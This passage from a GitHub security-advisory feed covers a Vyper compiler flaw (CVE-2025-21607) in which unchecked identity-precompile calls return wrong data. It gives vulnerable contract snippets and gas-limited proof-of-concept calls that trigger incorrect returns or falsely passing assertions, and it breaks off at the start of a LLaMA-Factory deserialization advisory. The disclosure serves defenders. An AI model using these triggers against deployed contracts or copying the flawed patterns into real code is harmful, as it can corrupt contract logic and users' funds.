0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n    b: DynArray[uint256, 4000] = a\n    return b[0]\n</code></pre>\n<p>Problematic Call:</p>\n<pre><code class=\"language-py\">print(c.foo())            # Prints 2\nprint(c.foo(gas=170000))  # Prints 0\n</code></pre>\n<h4 id=\"identity-in-abi-encoding-of-returndata\">Identity in ABI Encoding of Returndata</h4>\n<ul>\n<li>Affected versions: 0.3.2 - 0.4.0</li>\n<li>Complex types such as Dynamic array with Strings inside need to be abi encoded before being returned</li>\n<li>In that <code>return</code> there is a memory copy which can fail</li>\n</ul>\n<p>Vulnerable Code:</p>\n<pre><code class=\"language-py\">@external\n@view\ndef foo(x: String[1000000], y: String[1000000]) -&gt; DynArray[String[1000000], 2]:\n    z: DynArray[String[1000000], 2] = [x, y]\n    # Some code\n    return z\n</code></pre>\n<p>Problematic Call:</p>\n<pre><code class=\"language-py\">calldata0 = \"a\"*10\ncalldata1 = \"b\"*1000000\nc.foo(calldata0, calldata1)                   # Returns correct data\nc.foo(calldata0, calldata1, gas=48_400_000)   # Returns incorrect data (only first part)\n</code></pre>\n<h4 id=\"assertion-based-on-data-copied-through-identity\">Assertion based on data copied through Identity</h4>\n<ul>\n<li>Affected versions: 0.2.0 - 0.4.0</li>\n<li>An incomplete copy operation might falsify the result of a subsequent <code>assert</code></li>\n</ul>\n<p>Vulnerable Code:</p>\n<pre><code class=\"language-py\">@internal\ndef bar() -&gt; uint256[3000]:\n    a: uint256[3000] = [2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n    return a\n\n@external\ndef foo():\n    s: uint256[3000] = self.bar()\n    assert(s[0] == 0)\n</code></pre>\n<p>Problematic Call:</p>\n<pre><code class=\"language-py\">try:\n    c.foo()                     # Correctly reverts\nexcept Exception as e:\n    print(\"Correctly reverted\")\ntry:\n    c.foo(gas=210000)           # Incorrectly succeeds\n    print(\"Incorrectly succeeded\")\nexcept Exception:\n    pass\n</code></pre>\n<h4 id=\"identity-used-in-raw_revert\">Identity used in <code>raw_revert</code></h4>\n<ul>\n<li>Affected versions: 0.3.8 - 0.4.0</li>\n<li>A copy operation might appear as part of raw_revert</li>\n<li>As a result the revert reason might be incorrect</li>\n</ul>\n<p>Vulnerable Code:</p>\n<pre><code class=\"language-py\">@external\ndef foo(_data: Bytes[10000]):\n    b: Bytes[10000] = _data\n    raw_revert(b)\n</code></pre>\n<p>Problematic Call:</p>\n<pre><code class=\"language-py\">calldata = binascii.unhexlify(\"bb\" * 10_000)\nc.foo(calldata)       # Has correct revert reason\nc.foo(calldata, gas=4_800)       # Has empty revert reason, but not out-of-gas\n</code></pre>\n<h4 id=\"identity-to-copy-static-arrays\">Identity to copy static arrays</h4>\n<ul>\n<li>Affected versions: 0.2.0 - 0.4.0</li>\n<li>Vyper might perform a memory copy for static arrays, e.g. when moving them in and out of internal functions</li>\n<li>As this access is especially cheap (due to the static checks) it can also happen for smaller sizes</li>\n</ul>\n<p>Vulnerable Code:</p>\n<pre><code class=\"language-py\">@external\ndef foo(x: uint256[2500]) -&gt; uint256:\n    s: uint256[2500] = x\n    t: uint256[2500] = s\n    return t[0]\n</code></pre>\n<p>Problematic Call:</p>\n<pre><code class=\"language-py\">calldata = [2] + [0] * 2499\nprint(c.foo(calldata))              # Prints 2\nprint(c.foo(calldata, gas=74500))   # Prints 0\n</code></pre>\n<h4 id=\"identity-to-copy-and-return-string-or-bytes\">Identity to copy and return String or Bytes</h4>\n<ul>\n<li>Affected versions: 0.20 - 0.4.0</li>\n<li>Multiple situations in vyper might trigger a memory copy operation, e.g. moving data in and out of internal functions</li>\n<li>If the target buffer is later returned, incorrect data might be returned</li>\n</ul>\n<p>Vulnerable Code:</p>\n<pre><code class=\"language-py\">@external\n@view\ndef foo(x: String[1000000]) -&gt; String[1000000]:\n    return x\n</code></pre>\n<p>Problematic Call:</p>\n<pre><code class=\"language-py\">calldata = \"a\"*1000000\nx = c.foo(calldata)                 # Returns calldata\ny = c.foo(calldata, gas=8_000_000)  # Returns empty data\n</code></pre>\n<h4 id=\"identity-and-accessing-the-length-of-the-target-data\">Identity and accessing the length of the target data</h4>\n<ul>\n<li>Affected versions: 0.3.10 - 0.4.0</li>\n<li>Accessing the data is fairly cheap, making it possible for smaller data copies</li>\n</ul>\n<p>Vulnerable Code:</p>\n<pre><code class=\"language-py\">@external\n@view\ndef foo(x: String[1000000]) -&gt; uint256:\n    y: String[1000000] = x\n    return len(y)\n</code></pre>\n<p>Problematic Call:</p>\n<pre><code class=\"language-py\">calldata = \"a\"*1000000\nx = c.foo(calldata)                 # Returns correct length\ny = c.foo(calldata, gas=7_929_200)  # Returns incorrect length\n</code></pre>\n<h4 id=\"identity-to-copy-and-return-string-or-bytes-1\">Identity to copy and return String or Bytes</h4>\n<ul>\n<li>Affected versions: 0.3.10 - 0.4.0</li>\n<li>Multiple situations in vyper might trigger a memory copy operation, e.g. moving data in and out of internal functions</li>\n<li>If the target buffer is later returned, incorrect data might be returned</li>\n</ul>\n<p>Vulnerable Code:</p>\n<pre><code class=\"language-py\">@external\n@view\ndef foo(x: String[1000000]) -&gt; String[1000000]:\n    return x\n</code></pre>\n<p>Problematic Call:</p>\n<pre><code class=\"language-py\">calldata = \"a\"*1000000\nx = c.foo(calldata)                 # Returns calldata\ny = c.foo(calldata, gas=8_000_000)  # Returns empty data\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>A contract search was conducted and yielded no significant results.</p>\n<p>The advisory was rated a medium because the likelihood is low, but difficult to detect by source code analysis alone, and could yield unexpected results if a contract is affected by the bug.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-vgf2-gvx8-xwc3\">https://github.com/vyperlang/vyper/security/advisories/GHSA-vgf2-gvx8-xwc3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-21607\">https://nvd.nist.gov/vuln/detail/CVE-2025-21607</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/4451\">https://github.com/vyperlang/vyper/pull/4451</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/commit/7136eab0a254aa2ff7ddca41cc05f2ee1fa99caf\">https://github.com/vyperlang/vyper/commit/7136eab0a254aa2ff7ddca41cc05f2ee1fa99caf</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2025-33.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2025-33.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vgf2-gvx8-xwc3\">https://github.com/advisories/GHSA-vgf2-gvx8-xwc3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vgf2-gvx8-xwc3",
            "title": "[vyper] Vyper Does Not Check the Success of Certain Precompile Calls",
            "date_modified": "2025-04-24T14:39:59.000Z",
            "date_published": "2025-01-14T16:34:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vgf2-gvx8-xwc3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"description\">Description</h3>\n<p>A critical vulnerability exists in the <code>llamafy_baichuan2.py</code> script of the <a href=\"https://github.com/hiyouga/LLaMA-Factory\">LLaMA-Factory</a> project. The script performs insecure deserialization using <code>torch.load()</code> on user-supplied <code>.bin</code> files from an input directory. An attacker can exploit this behavior by crafting a malicious <code>.bin</code> file that executes arbitrary commands during deserialization.</p>\n<h3 id=\"attack-vector\">Attack Vector</h3>\n<p>This vulnerability is <strong>exploitable without authentication or privileges</strong> when a user is tricked into:</p>\n<ol>\n<li>Downloading or cloning a 